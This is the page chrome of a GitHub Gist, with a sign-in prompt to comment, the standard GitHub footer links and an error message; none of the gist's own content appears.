[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fswkim101%2Ff473b9a60e6d4635268402a2cd2025ac)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


